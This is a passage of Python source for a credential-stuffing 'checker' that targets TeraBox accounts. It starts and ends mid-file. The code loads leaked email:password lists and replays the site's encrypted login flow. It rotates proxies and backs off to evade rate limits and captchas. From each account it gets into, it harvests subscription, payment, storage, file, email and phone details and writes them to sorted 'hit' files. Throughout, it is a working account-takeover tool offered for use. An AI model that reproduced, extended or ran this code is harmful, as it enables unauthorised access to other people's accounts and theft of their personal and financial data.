                "email": email, "password": password}

    try:
        pre = eyelifter_prelogin(s, warm, email, loc)
    except Exception as e:
        return {"status": "error", "error_type": f"net_{type(e).__name__}",
                "reason": "prelogin_net", "email": email, "password": password}

    pcode = pre.get("code")
    if pcode in EYELIFTER_RATE_CODES:
        return {"status": "error", "error_type": "rate_limit",
                "reason": f"prelogin_rl_{pcode}", "email": email, "password": password}
    if pcode in EYELIFTER_CAPTCHA_CODES:
        return {"status": "error", "error_type": "captcha",
                "reason": f"prelogin_cap_{pcode}", "email": email, "password": password}
    if pcode in EYELIFTER_NOACCT_CODES:
        return {"status": "bad", "reason": "no_account",
                "email": email, "password": password}
    if pcode != 0:
        return {"status": "error", "error_type": f"prelogin_{pcode}",
                "reason": pre.get("msg") or f"code_{pcode}",
                "email": email, "password": password}

    pd = pre.get("data") or {}
    seval = pd.get("seval")
    random_val = pd.get("random")
    server_ts = pd.get("timestamp")
    if not seval or random_val is None or not server_ts:
        return {"status": "error", "error_type": "prelogin_parse",
                "reason": "missing seval/random/ts",
                "email": email, "password": password}

    try:
        pj, presp = eyelifter_get_pubkey(s, warm, loc)
    except Exception as e:
        return {"status": "error", "error_type": f"net_{type(e).__name__}",
                "reason": "pubkey_net", "email": email, "password": password}

    if not pj or pj.get("code") != 0:
        code = (pj or {}).get("code")
        if code in EYELIFTER_RATE_CODES:
            return {"status": "error", "error_type": "rate_limit",
                    "reason": f"pubkey_rl_{code}", "email": email, "password": password}
        if code in EYELIFTER_CAPTCHA_CODES:
            return {"status": "error", "error_type": "captcha",
                    "reason": f"pubkey_cap_{code}", "email": email, "password": password}
        return {"status": "error", "error_type": f"pubkey_{code}",
                "reason": f"pubkey_{code}", "email": email, "password": password}

    try:
        pem = eyelifter_aes_decrypt_pp1(pj["data"]["pp1"], pj["data"]["pp2"])
        key = RSA.import_key(pem)
    except Exception as e:
        return {"status": "error", "error_type": "rsa_load",
                "reason": type(e).__name__, "email": email, "password": password}

    md5hex = hashlib.md5(password.encode()).hexdigest()
    rsa_plain = eyelifter_h_transform(md5hex)
    try:
        ct = PKCS1_v1_5.new(key).encrypt(rsa_plain.encode("utf-8"))
        pwd_enc = base64.b64encode(ct).decode().replace("+", "-").replace("/", "_")
    except Exception as e:
        return {"status": "error", "error_type": "rsa_enc",
                "reason": type(e).__name__, "email": email, "password": password}

    prand = hashlib.sha1(
        f"web-{seval}-{pwd_enc}-{email}-{loc['browserid']}-{random_val}".encode()
    ).hexdigest()

    try:
        j, resp = eyelifter_do_login(s, warm, loc, email, pwd_enc, seval, prand,
                                     random_val, server_ts)
    except Exception as e:
        return {"status": "error", "error_type": f"net_{type(e).__name__}",
                "reason": "login_net", "email": email, "password": password}

    if j is None:
        body = (resp.text or "")[:200].lower()
        if any(k in body for k in ("captcha", "punish", "slider", "aliyuncs",
                                    "security check", "checking your browser")):
            return {"status": "error", "error_type": "captcha",
                    "reason": "login_html_captcha", "email": email, "password": password}
        return {"status": "error", "error_type": "non_json",
                "reason": "login_nonjson", "email": email, "password": password}

    code = j.get("code")

    if code == 0:
        login_data = j.get("data") or {}
        prefix = login_data.get("region_domain_prefix") or "dm"
        dm_host = eyelifter_build_shard(warm.base, prefix)

        try:
            rm = s.get(f"{warm.base}/main", timeout=25,
                       headers={"accept": "text/html,application/xhtml+xml,*/*",
                                "referer": f"{warm.base}/login"})
            bt = eyelifter_extract_bdstoken(rm.text)
            if bt:
                s.cookies.set("bdstoken", bt, domain=eyelifter_base_domain(warm.base))
                s.cookies.set("bdstoken", bt, domain=dm_host)
        except Exception:
            pass

        ck = eyelifter_cookies_dict(s)

        if _EYELIFTER_CFG.settings.get("capture_extras", True):
            try:
                cap = eyelifter_capture(s, warm, loc, email, password, ck, dm_host)
            except Exception:
                cap = {"email": email, "password": password, "region": warm.region}
        else:
            cap = {"email": email, "password": password, "region": warm.region}

        cap["status"] = "hit"
        cap["login"] = {
            "displayName": login_data.get("displayName"),
            "reg_time": login_data.get("reg_time"),
            "reg_country": login_data.get("reg_country"),
            "cur_country": login_data.get("cur_country"),
            "region_domain_prefix": prefix,
            "ndus": ck.get("ndus"),
            "bdstoken": ck.get("bdstoken"),
            "csrfToken": ck.get("csrfToken"),
        }
        return cap

    if code in EYELIFTER_RATE_CODES:
        return {"status": "error", "error_type": "rate_limit",
                "reason": f"login_rl_{code}", "email": email, "password": password}
    if code in EYELIFTER_CAPTCHA_CODES:
        return {"status": "error", "error_type": "captcha",
                "reason": f"login_cap_{code}", "email": email, "password": password}
    if code in EYELIFTER_LOCKED_CODES:
        return {"status": "locked", "reason": f"locked_{code}",
                "email": email, "password": password}
    if code in EYELIFTER_NOACCT_CODES:
        return {"status": "bad", "reason": "no_account",
                "email": email, "password": password}
    if code in EYELIFTER_BAD_CODES:
        return {"status": "bad", "reason": f"bad_{code}",
                "email": email, "password": password}

    return {"status": "error", "error_type": f"login_{code}",
            "reason": j.get("msg") or f"code_{code}",
            "email": email, "password": password}


def eyelifter_run_retry(combo, srv, region, proxy):
    attempts = _EYELIFTER_CFG.settings.get("retries", 2) + 1
    lp = proxy
    result = None
    try:
        for a in range(attempts):
            if _EYELIFTER_STOP.is_set():
                break
            if a > 0:
                np = eyelifter_pick_proxy(exclude=lp)
                if np:
                    if lp and lp != np:
                        eyelifter_rel_proxy(lp)
                    proxy = np
                eyelifter_dbg("RETRY",
                    f"attempt {a+1}/{attempts} · {combo.split(':', 1)[0][:40]}")
            lp = proxy

            try:
                result = eyelifter_check(combo, srv, region, proxy)
            except Exception as e:
                result = {"status": "error",
                          "error_type": f"crash_{type(e).__name__}",
                          "reason": str(e)[:80],
                          "email": combo.split(":", 1)[0],
                          "password": combo.split(":", 1)[1] if ":" in combo else ""}

            st = result.get("status")
            et = result.get("error_type", "")

            if st in ("hit", "bad", "locked"):
                break

            is_last = a == attempts - 1

            if et == "rate_limit":
                with _EYELIFTER_LK:
                    _EYELIFTER_ST["rl"] += 1
                if proxy:
                    eyelifter_cool_proxy(proxy, 120.0)
                w = min(15, _EYELIFTER_CFG.settings.get("rate_limit_delay", 15))
                eyelifter_rl_backoff(w)
                if is_last:
                    break
                if _EYELIFTER_STOP.wait(w * (0.5 + random.random() * 0.5)):
                    break
                continue

            if et == "captcha":
                with _EYELIFTER_LK:
                    _EYELIFTER_ST["captcha"] += 1
                if proxy:
                    eyelifter_cool_proxy(proxy, 300.0)
                if is_last:
                    break
                if _EYELIFTER_STOP.wait(0.3 + random.random() * 0.4):
                    break
                continue

            if et.startswith("net_") or et.startswith("crash_net"):
                if proxy:
                    eyelifter_bad_proxy(proxy)
                if is_last:
                    break
                if _EYELIFTER_STOP.wait(
                        _EYELIFTER_CFG.settings.get("retry_delay", 1.5)):
                    break
                continue

            if et in ("no_warm", "warmup_fail", "pubkey_fail") or et.startswith("pubkey_"):
                if is_last:
                    break
                if _EYELIFTER_STOP.wait(0.5):
                    break
                continue

            if et.startswith("rsa_"):
                if is_last:
                    break
                if _EYELIFTER_STOP.wait(0.5):
                    break
                continue

            if et == "prelogin_parse" or et.startswith("prelogin_"):
                if is_last:
                    break
                if _EYELIFTER_STOP.wait(0.3 + random.random() * 0.4):
                    break
                continue

            break
    finally:
        if lp:
            eyelifter_rel_proxy(lp)

    return result or {"status": "error", "error_type": "no_result",
                      "reason": "no_result",
                      "email": combo.split(":", 1)[0],
                      "password": combo.split(":", 1)[1] if ":" in combo else ""}


def eyelifter_classify(result):
    st = result.get("status")
    if st == "hit":
        user = result.get("user") or {}
        if user.get("is_vip") == 1:
            return "vip"
        return "free"
    if st == "bad":
        return "bad"
    if st == "locked":
        return "locked"
    et = result.get("error_type", "")
    if et == "rate_limit":
        return "rate"
    if et == "captcha":
        return "captcha"
    return "error"


def eyelifter_fmt_line(u, kind):
    login = u.get("login") or {}
    user = u.get("user") or {}
    profile = u.get("profile") or {}
    quota = u.get("quota") or {}
    files = u.get("files") or {}
    orders = u.get("orders") or {}
    points = u.get("points", 0)

    node = login.get("region_domain_prefix") or "-"
    country = user.get("country") or login.get("reg_country") or "-"
    age = eyelifter_age_str(login.get("reg_time"))
    name = login.get("displayName") or "-"

    vip_level = user.get("is_vip_level", 0)
    tier = EYELIFTER_TIER_MAP.get(vip_level, "?")

    if kind == "vip":
        vip_end = user.get("vip_end_time") or 0
        if vip_end:
            days = eyelifter_days_left(vip_end)
            exp_str = f"{eyelifter_ts_date(vip_end)}({days}d)"
        else:
            exp_str = "none"
        auto_renew = "Y" if user.get("is_auto_renew") == 1 else "N"
        ever_paid = "Y" if user.get("has_iap_record") else "N"
        if user.get("renew_price"):
            cost = f"{user['renew_price'] / 100:.2f}{user.get('price_currency', '').upper()}"
        else:
            cost = "-"
        plan = user.get("sign_product_name") or "-"
        paid_amt = orders.get("last_paid", 0)
        list_price = orders.get("last_price", 0)
        if orders.get("count") and list_price:
            pmt = f"{paid_amt / 100:.2f}/{list_price / 100:.2f}"
        else:
            pmt = "-"
        if quota:
            q_str = f"{eyelifter_hsize(quota.get('total'))}/{eyelifter_hsize(quota.get('used'))}"
        else:
            q_str = "-"
        f_str = eyelifter_fmt_files(files)
        bound_email = profile.get("bound_email") or "-"

        parts = [
            f"Node={node}",
            f"Tier={tier}",
            f"Name={name}",
            f"Country={country}",
            f"Age={age}",
            f"Exp={exp_str}",
            f"Auto={auto_renew}",
            f"Cost={cost}",
            f"Plan={plan}",
            f"Paid={ever_paid}",
            f"Pmt={pmt}",
            f"Pts={points}",
            f"Quota={q_str}",
            f"Files={f_str}",
            f"Mail={bound_email}",
        ]
        if profile.get("bound_phone") and profile["bound_phone"] != "-":
            parts.append(f"Phone={profile['bound_phone']}")
        parts.append(EYELIFTER_LINE_TAG)
        return f"VIP {u['email']}:{u['password']} | " + " | ".join(parts)
    else:
        if quota:
            q_str = f"{eyelifter_hsize(quota.get('total'))}/{eyelifter_hsize(quota.get('used'))}"
        else:
            q_str = "-"
        f_str = eyelifter_fmt_files(files)
        parts = [
            f"Node={node}",
            f"Tier={tier}",
            f"Name={name}",
            f"Country={country}",
            f"Age={age}",
            f"Pts={points}",
            f"Quota={q_str}",
            f"Files={f_str}",
            EYELIFTER_LINE_TAG,
        ]
        return f"FREE {u['email']}:{u['password']} | " + " | ".join(parts)


def eyelifter_spacer():
    return "\n\n" if _EYELIFTER_CFG.settings.get("hit_spacer", True) else "\n"


def eyelifter_record(combo, result):
    global _EYELIFTER_VIP_F, _EYELIFTER_FREE_F, _EYELIFTER_BAD_F
    global _EYELIFTER_LOCKED_F, _EYELIFTER_CAPTCHA_F, _EYELIFTER_RATE_F
    global _EYELIFTER_ERR_F, _EYELIFTER_JSON_F

    verdict = eyelifter_classify(result)

    with _EYELIFTER_LK:
        _EYELIFTER_ST["checked"] += 1
        done = _EYELIFTER_ST["checked"]
        if verdict == "vip":
            _EYELIFTER_ST["vip"] += 1
        elif verdict == "free":
            _EYELIFTER_ST["free"] += 1
        elif verdict == "bad":
            _EYELIFTER_ST["bad"] += 1
        elif verdict == "locked":
            _EYELIFTER_ST["locked"] += 1
        elif verdict == "captcha":
            _EYELIFTER_ST["captcha"] += 1
        elif verdict == "rate":
            _EYELIFTER_ST["rl"] += 1
        else:
            _EYELIFTER_ST["errors"] += 1
        total = _EYELIFTER_TOTAL

    sp = eyelifter_spacer()

    if verdict == "vip":
        line = eyelifter_fmt_line(result, "vip")
        eyelifter_rline(done, total, "VIP", line, "32", True, whole=True)
        eyelifter_sw(_EYELIFTER_VIP_F, line + sp)
        try:
            eyelifter_sw(_EYELIFTER_JSON_F, json.dumps(result, ensure_ascii=False) + "\n\n")
        except Exception:
            pass

    elif verdict == "free":
        line = eyelifter_fmt_line(result, "free")
        eyelifter_rline(done, total, "FREE", line, "36", True, whole=True)
        eyelifter_sw(_EYELIFTER_FREE_F, line + sp)
        try:
            eyelifter_sw(_EYELIFTER_JSON_F, json.dumps(result, ensure_ascii=False) + "\n\n")
        except Exception:
            pass

    elif verdict == "bad":
        reason = result.get("reason", "invalid")
        eyelifter_rline(done, total, "BAD", f"BAD {combo} | {reason}", "31")
        eyelifter_sw(_EYELIFTER_BAD_F,
                     f"BAD {combo} | {reason} | {EYELIFTER_LINE_TAG}{sp}")

    elif verdict == "locked":
        reason = result.get("reason", "locked")
        eyelifter_rline(done, total, "LOCKED", f"LOCKED {combo} | {reason}", "35", True)
        eyelifter_sw(_EYELIFTER_LOCKED_F,
                     f"LOCKED {combo} | {reason} | {EYELIFTER_LINE_TAG}{sp}")

    elif verdict == "captcha":
        reason = result.get("reason", "captcha")
        eyelifter_rline(done, total, "CAPTCHA", f"CAPTCHA {combo} | {reason}", "33", True)
        eyelifter_sw(_EYELIFTER_CAPTCHA_F,
                     f"CAPTCHA {combo} | {reason} | {EYELIFTER_LINE_TAG}{sp}")
        if not _EYELIFTER_POOL:
            with _EYELIFTER_LK:
                captcha_count = _EYELIFTER_ST["captcha"]
            if captcha_count >= 3:
                eyelifter_log("🛑", "WARN", "ABORT",
                    "3+ captchas on direct — IP is flagged. stopping run. "
                    "use proxies or wait 30-60min [eyelifter]")
                _EYELIFTER_STOP.set()

    elif verdict == "rate":
        reason = result.get("reason", "rate")
        eyelifter_rline(done, total, "RATE", f"RATE {combo} | {reason}", "31", True)
        eyelifter_sw(_EYELIFTER_RATE_F,
                     f"RATE {combo} | {reason} | {EYELIFTER_LINE_TAG}{sp}")

    else:
        et = result.get("error_type") or "unknown"
        rn = result.get("reason") or ""
        detail = et if (not rn or rn == et) else f"{et} · {rn}"
        eyelifter_rline(done, total, "ERR", f"ERR {combo} | [{detail}]", "33")
        eyelifter_sw(_EYELIFTER_ERR_F,
                     f"ERR {combo} | [{detail}] | {EYELIFTER_LINE_TAG}{sp}")


_EYELIFTER_COMBORX = re.compile(
    r'^\s*["\']?([^:\s|;,]+@[^:\s|;,]+\.[a-zA-Z]{2,})["\']?\s*[:|;,]\s*["\']?([^\s|;,]+)["\']?',
    re.I)
_EYELIFTER_ANYRX = re.compile(
    r'([^:\s|;,]+@[^:\s|;,]+\.[a-zA-Z]{2,})\s*[:|;,]\s*([^\s|;,]+)',
    re.I)


def eyelifter_extract_combos(content):
    out = set()
    skipped = 0
    for raw in content.splitlines():
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        m = _EYELIFTER_COMBORX.match(line)
        if m:
            e = m.group(1)
            p = m.group(2)
            if e and p and len(p) >= 3:
                out.add(f"{e}:{p}")
        else:
            skipped += 1

    before = len(out)
    for m in _EYELIFTER_ANYRX.finditer(content):
        e = m.group(1)
        p = m.group(2)
        if e and p and len(p) >= 3:
            out.add(f"{e}:{p}")
    extra = len(out) - before

    if skipped:
        eyelifter_log("🧹", "INFO", "EXTRACT",
                      f"{skipped} lines skipped, +{extra} rescued [eyelifter]")
    return sorted(out)


def eyelifter_open_files(folder):
    names = ["terabox_vip.txt", "terabox_free.txt", "terabox_bad.txt",
             "terabox_locked.txt", "terabox_captcha.txt", "terabox_rate.txt",
             "terabox_errors.txt"]
    op = []
    try:
        for n in names:
            op.append(open(os.path.join(folder, n), "w", encoding="utf-8"))
        op.append(open(os.path.join(folder, "terabox_hits_full.jsonl"), "w", encoding="utf-8"))
    except Exception:
        for h in op:
            try:
                h.close()
            except Exception:
                pass
        raise
    return op


class EyelifterRunner:
    def __init__(self, combos, srv, region):
        self.combos = combos
        self.srv = srv
        self.region = region
        self.threads = _EYELIFTER_CFG.settings["threads"]
        self.gap = _EYELIFTER_CFG.settings.get("combo_delay", 0.5)

    def eyelifter_task(self, combo):
        if _EYELIFTER_STOP.is_set():
            return
        if self.gap > 0:
            if _EYELIFTER_STOP.wait(self.gap * (0.5 + random.random())):
                return
        if _EYELIFTER_STOP.is_set():
            return
        eyelifter_rl_wait()
        if _EYELIFTER_STOP.is_set():
            return
        proxy = eyelifter_pick_proxy() if _EYELIFTER_POOL else None
        try:
            result = eyelifter_run_retry(combo, self.srv, self.region, proxy)
        except Exception as e:
            result = {"status": "error",
                      "error_type": f"runner_{type(e).__name__}",
                      "reason": str(e)[:80],
                      "email": combo.split(":", 1)[0],
                      "password": combo.split(":", 1)[1] if ":" in combo else ""}
        try:
            eyelifter_record(combo, result)
        except Exception:
            pass

    def eyelifter_run(self):
        ex = ThreadPoolExecutor(max_workers=self.threads)
        inflight = set()
        try:
            for c in self.combos:
                if _EYELIFTER_STOP.is_set():
                    break
                inflight.add(ex.submit(self.eyelifter_task, c))
                if len(inflight) >= self.threads * 4:
                    done, inflight = wait(inflight, timeout=0.25,
                                          return_when=FIRST_COMPLETED)
                    for f in done:
                        try:
                            f.result(timeout=0.1)
                        except Exception:
                            pass
            while inflight:
                done, inflight = wait(inflight, timeout=0.25,
                                      return_when=FIRST_COMPLETED)
                for f in done:
                    try:
                        f.result(timeout=0.1)
                    except Exception:
                        pass
        except KeyboardInterrupt:
            _EYELIFTER_STOP.set()
        finally:
            _EYELIFTER_STOP.set()
            try:
                ex.shutdown(wait=True, cancel_futures=True)
            except TypeError:
                ex.shutdown(wait=True)


def eyelifter_ask_threads():
    print()
    print(eyelifter_color("96", f"  Threads [eyelifter]  (1-{EYELIFTER_MAX_THREADS})"))
    print(eyelifter_color("90", f"  current: {_EYELIFTER_CFG.settings['threads']}"))
    raw = input(eyelifter_color("96", "  > ")).strip()
    if not raw:
        return _EYELIFTER_CFG.settings["threads"]
    try:
        t = int(raw)
    except ValueError:
        return _EYELIFTER_CFG.settings["threads"]
    return max(1, min(EYELIFTER_MAX_THREADS, t))


def eyelifter_pick_region():
    eyelifter_section("SELECT REGION [eyelifter]")
    keys = list(EYELIFTER_REGIONS.keys())
    for i, k in enumerate(keys, 1):
        r = EYELIFTER_REGIONS[k]
        mark = "*" if k == _EYELIFTER_CFG.settings["region"] else " "
        print(f"  {mark} {eyelifter_color('96', f'[{i}]')}  "
              f"{k}  {r['name']:<12}  {r['domain']}")
    print(f"  {eyelifter_color('90', 'current:')} {_EYELIFTER_CFG.settings['region']}")
    raw = input(f"{eyelifter_color('96', '[*] select > ')}").strip()
    if not raw:
        return _EYELIFTER_CFG.settings["region"]
    if raw.upper() in EYELIFTER_REGIONS:
        _EYELIFTER_CFG.settings["region"] = raw.upper()
        try:
            _EYELIFTER_CFG.eyelifter_save()
        except Exception:
            pass
        return raw.upper()
    try:
        idx = int(raw) - 1
        if 0 <= idx < len(keys):
            k = keys[idx]
            _EYELIFTER_CFG.settings["region"] = k
            try:
                _EYELIFTER_CFG.eyelifter_save()
            except Exception:
                pass
            return k
    except ValueError:
        pass
    return _EYELIFTER_CFG.settings["region"]


def eyelifter_single_check(proxies, srv, region):
    global _EYELIFTER_POOL, _EYELIFTER_BADP
    _EYELIFTER_STOP.clear()

    eyelifter_section(f"SINGLE CHECK — {region} [eyelifter]")
    combo = input(f"{eyelifter_color('96', '[*] email:password > ')}").strip()
    if ":" not in combo:
        eyelifter_log("✗", "ERROR", "INPUT", "invalid format [eyelifter]")
        if sys.stdin.isatty():
            input(f"{eyelifter_color('93', '[*] enter > ')}")
        return

    proxy = None
    if proxies:
        if not _EYELIFTER_POOL:
            _EYELIFTER_POOL = list(proxies)
            _EYELIFTER_BADP = {}
        proxy = eyelifter_pick_proxy()

    eyelifter_log("🔍", "STEP", "CHECK",
        f"checking {combo.split(':')[0]} · {region} [eyelifter]")
    t0 = time.time()
    result = eyelifter_run_retry(combo, srv, region, proxy)
    el = time.time() - t0

    st = result.get("status")
    if st == "hit":
        kind = "vip" if (result.get("user") or {}).get("is_vip") == 1 else "free"
        user = result.get("user") or {}
        login = result.get("login") or {}
        profile = result.get("profile") or {}
        quota = result.get("quota") or {}
        files = result.get("files") or {}
        orders = result.get("orders") or {}
        vip_level = user.get("is_vip_level", 0)
        tier = EYELIFTER_TIER_MAP.get(vip_level, "?")

        rows = [
            ("Status", "💰 VIP HIT" if kind == "vip" else "🆓 FREE (no vip)"),
            ("Email", result.get("email")),
            ("Password", result.get("password")),
            ("Node", login.get("region_domain_prefix")),
            ("DisplayName", login.get("displayName")),
            ("Country", user.get("country") or login.get("reg_country")),
            ("Signup Age", eyelifter_age_str(login.get("reg_time"))),
            ("Tier", tier),
        ]
        if kind == "vip":
            rows.extend([
                ("VIP Level", str(vip_level)),
                ("VIP Ends", f"{eyelifter_ts_date(user.get('vip_end_time'))} ({eyelifter_days_left(user.get('vip_end_time'))}d)"),
                ("Auto Renew", "yes" if user.get("is_auto_renew") == 1 else "no"),
                ("Renew Cost", f"{user.get('renew_price', 0) / 100:.2f} {user.get('price_currency', '').upper()}" if user.get("renew_price") else "-"),
                ("Plan", user.get("sign_product_name") or "-"),
                ("Ever Paid", "yes" if user.get("has_iap_record") else "no"),
            ])
        rows.extend([
            ("Points", str(result.get("points", 0))),
            ("Quota Total", eyelifter_hsize(quota.get("total"))),
            ("Quota Used", eyelifter_hsize(quota.get("used"))),
            ("Files", eyelifter_fmt_files(files)),
            ("Bound Email", profile.get("bound_email") or "-"),
            ("Bound Phone", profile.get("bound_phone") or "-"),
            ("Login Type", str(profile.get("login_type") or "-")),
        ])
        if kind == "vip" and orders.get("count"):
            rows.append(("Order Count", str(orders.get("count"))))
            rows.append(("Last Payment", f"{orders.get('last_paid', 0) / 100:.2f} / {orders.get('last_price', 0) / 100:.2f}"))
            rows.append(("Pay Method", orders.get("pay_way") or "-"))
        rows.append(("Time", f"{el:.2f}s"))
        rows.append(("Credit", f"eyelifter · {EYELIFTER_TG_USER} · {EYELIFTER_TG_CHAN}"))
        eyelifter_summary(rows)

    elif st == "bad":
        eyelifter_log("✗", "ERROR", "RESULT",
            f"bad — {result.get('reason', 'invalid')} [eyelifter]")

    elif st == "locked":
        eyelifter_log("🔒", "WARN", "RESULT",
            f"locked — {result.get('reason', 'locked')} [eyelifter]")

    else:
        et = result.get("error_type") or "unknown"
        rn = result.get("reason") or ""
        detail = et if (not rn or rn == et) else f"{et} · {rn}"
        eyelifter_log("✗", "ERROR", "RESULT", f"{detail} [eyelifter]")

    if sys.stdin.isatty():
        input(f"{eyelifter_color('93', '[*] enter > ')}")


def eyelifter_bulk_check(proxies, srv, region):
    global _EYELIFTER_TOTAL, _EYELIFTER_VIP_F, _EYELIFTER_FREE_F, _EYELIFTER_BAD_F
    global _EYELIFTER_LOCKED_F, _EYELIFTER_CAPTCHA_F, _EYELIFTER_RATE_F
    global _EYELIFTER_ERR_F, _EYELIFTER_JSON_F, _EYELIFTER_FOLDER
    global _EYELIFTER_POOL, _EYELIFTER_BADP

    eyelifter_reset_stats()
    eyelifter_section(f"BULK CHECK — {region} [eyelifter]")

    path = input(f"{eyelifter_color('96', '[*] combo file > ')}").strip()
    if not path or not os.path.isfile(path):
        eyelifter_log("✗", "ERROR", "FILE", "not found [eyelifter]")
        if sys.stdin.isatty():
            input(f"{eyelifter_color('93', '[*] enter > ')}")
        return

    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        content = f.read()
    combos = eyelifter_extract_combos(content)
    if not combos:
        eyelifter_log("✗", "ERROR", "EXTRACT", "no valid combos [eyelifter]")
        if sys.stdin.isatty():
            input(f"{eyelifter_color('93', '[*] enter > ')}")
        return

    eyelifter_log("✓", "INFO", "EXTRACT", f"{len(combos)} unique combos [eyelifter]")

    if not proxies and len(combos) > 15:
        eyelifter_log("⚠️", "WARN", "PROXY",
            "no proxies + >15 combos = guaranteed captcha wall [eyelifter]")
        print(eyelifter_color("93",
            "  baidu flips to captcha after ~15-25 logins per IP."))
        print(eyelifter_color("93",
            "  continuing will get you flagged"))
        ans = input(eyelifter_color("96",
            "  continue anyway? (y/N) > ")).strip().lower()
        if ans != "y":
            eyelifter_log("✗", "INFO", "ABORT", "no proxies, not continuing [eyelifter]")
            return

    nt = eyelifter_ask_threads()
    if nt != _EYELIFTER_CFG.settings["threads"]:
        _EYELIFTER_CFG.settings["threads"] = nt
        try:
            _EYELIFTER_CFG.eyelifter_save()
        except Exception:
            pass
    eyelifter_log("⚙️", "INFO", "THREADS",
                  f"{_EYELIFTER_CFG.settings['threads']} [eyelifter]")

    if not srv.ping():
        eyelifter_log("✗", "ERROR", "WARM", "warmup not ready [eyelifter]")
        if sys.stdin.isatty():
            input(f"{eyelifter_color('93', '[*] enter > ')}")
        return

    root = EYELIFTER_RESULTS_DIR
    os.makedirs(root, exist_ok=True)
    try:
        os.chmod(root, 0o700)
    except OSError:
        pass
    ts = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    tag = "".join(random.choices(string.ascii_lowercase + string.digits, k=4))
    _EYELIFTER_FOLDER = os.path.join(root, f"Session_{ts}_{tag}")
    os.makedirs(_EYELIFTER_FOLDER, exist_ok=True)
    try:
        os.chmod(_EYELIFTER_FOLDER, 0o700)
    except OSError:
        pass

    try:
        (_EYELIFTER_VIP_F, _EYELIFTER_FREE_F, _EYELIFTER_BAD_F,
         _EYELIFTER_LOCKED_F, _EYELIFTER_CAPTCHA_F, _EYELIFTER_RATE_F,
         _EYELIFTER_ERR_F, _EYELIFTER_JSON_F) = eyelifter_open_files(_EYELIFTER_FOLDER)
    except Exception as e:
        eyelifter_log("✗", "ERROR", "OPEN", f"{e} [eyelifter]")
        if sys.stdin.isatty():
            input(f"{eyelifter_color('93', '[*] enter > ')}")
        return

    header = (f"# TeraBox Universal Checker by eyelifter - {datetime.now().isoformat()}\n"
              f"# Region: {region} · {EYELIFTER_REGIONS[region]['domain']}\n"
              f"# Seal: {EYELIFTER_SEAL_STR}\n"
              f"# Credit: eyelifter | {EYELIFTER_TG_USER} | {EYELIFTER_TG_CHAN}\n\n")
    for fh in (_EYELIFTER_VIP_F, _EYELIFTER_FREE_F, _EYELIFTER_BAD_F,
               _EYELIFTER_LOCKED_F, _EYELIFTER_CAPTCHA_F, _EYELIFTER_RATE_F,
               _EYELIFTER_ERR_F):
        fh.write(header)

    _EYELIFTER_TOTAL = len(combos)
    eyelifter_log("📊", "INFO", "FILE", f"loaded {_EYELIFTER_TOTAL} [eyelifter]")

    if proxies:
        _EYELIFTER_POOL = list(proxies)
        _EYELIFTER_BADP = {}
        eyelifter_log("🌐", "INFO", "PROXY", f"{len(proxies)} loaded [eyelifter]")
    else:
        _EYELIFTER_POOL = []
        _EYELIFTER_BADP = {}
        eyelifter_log("⚠️", "WARN", "PROXY", "direct connection [eyelifter]")

    _EYELIFTER_STOP.clear()
    eyelifter_log("🚀", "INFO", "START",
        f"firing {_EYELIFTER_TOTAL} combos across "
        f"{_EYELIFTER_CFG.settings['threads']} threads "
        f"| {EYELIFTER_TG_USER} | {EYELIFTER_TG_CHAN} [eyelifter]")

    hb_stop = threading.Event()

    def heartbeat():
        last = 0
        while not hb_stop.wait(5.0):
            with _EYELIFTER_LK:
                snap = dict(_EYELIFTER_ST)
            if snap["checked"] == last:
                continue
            last = snap["checked"]
            el2 = time.time() - _EYELIFTER_START
            spd = snap["checked"] / max(el2, 0.001)
            eyelifter_log("💓", "LIVE", "LIVE",
                f"{snap['checked']}/{_EYELIFTER_TOTAL} · "
                f"vip={snap['vip']} free={snap['free']} bad={snap['bad']} "
                f"err={snap['errors']} · {spd:.1f}/s [eyelifter]")

    hb = threading.Thread(target=heartbeat, daemon=True)
    hb.start()

    try:
        EyelifterRunner(combos, srv, region).eyelifter_run()
    except KeyboardInterrupt:
        _EYELIFTER_STOP.set()
        eyelifter_log("🛑", "WARN", "STOP", "stopping... [eyelifter]")
    except Exception as e:
        eyelifter_log("✗", "ERROR", "RUN", f"{type(e).__name__}: {str(e)[:120]} [eyelifter]")
    finally:
        hb_stop.set()
        _EYELIFTER_STOP.set()
        time.sleep(0.3)
        for fh in (_EYELIFTER_VIP_F, _EYELIFTER_FREE_F, _EYELIFTER_BAD_F,
                   _EYELIFTER_LOCKED_F, _EYELIFTER_CAPTCHA_F, _EYELIFTER_RATE_F,
                   _EYELIFTER_ERR_F, _EYELIFTER_JSON_F):
            try:
                fh.close()
            except Exception:
                pass

    with _EYELIFTER_LK:
        snap = dict(_EYELIFTER_ST)

    for base, key in (
        ("terabox_vip.txt", "vip"),
        ("terabox_free.txt", "free"),
        ("terabox_bad.txt", "bad"),
        ("terabox_locked.txt", "locked"),
        ("terabox_captcha.txt", "captcha"),
        ("terabox_rate.txt", "rl"),
        ("terabox_errors.txt", "errors"),
    ):
        old = os.path.join(_EYELIFTER_FOLDER, base)
        new = os.path.join(_EYELIFTER_FOLDER,
                           base.replace(".txt", f"_{snap[key]}.txt"))
        if os.path.exists(old):
            try:
                os.rename(old, new)
            except Exception:
                pass

    eyelifter_log("💾", "INFO", "SAVE", f"results → {_EYELIFTER_FOLDER} [eyelifter]")
    eyelifter_divider()
    el = time.time() - _EYELIFTER_START
    eyelifter_summary([
        ("Region", f"{region} · {EYELIFTER_REGIONS[region]['domain']}"),
        ("Total", _EYELIFTER_TOTAL),
        ("VIP HIT", snap["vip"]),
        ("FREE", snap["free"]),
        ("Bad creds", snap["bad"]),
        ("Locked", snap["locked"]),
        ("Captcha", snap["captcha"]),
        ("Rate limited", snap["rl"]),
        ("Errors", snap["errors"]),
        ("Proxy fails", snap["pfails"]),
        ("Time", f"{el:.1f}s"),
        ("Speed", f"{_EYELIFTER_TOTAL / max(el, 0.001):.2f} combo/s"),
        ("Folder", _EYELIFTER_FOLDER),
        ("Credit", f"eyelifter · {EYELIFTER_TG_USER} · {EYELIFTER_TG_CHAN}"),
    ])
    if sys.stdin.isatty():
        input(f"{eyelifter_color('93', '[*] enter > ')}")


def eyelifter_settings_menu():
    eyelifter_section("SETTINGS [eyelifter]")
    s = _EYELIFTER_CFG.settings
    print(f"  [1]  Region:              {s['region']} ({EYELIFTER_REGIONS[s['region']]['domain']})")
    print(f"  [2]  Threads:             {s['threads']} (1-{EYELIFTER_MAX_THREADS})")
    print(f"  [3]  Timeout:             {s['timeout']}s")
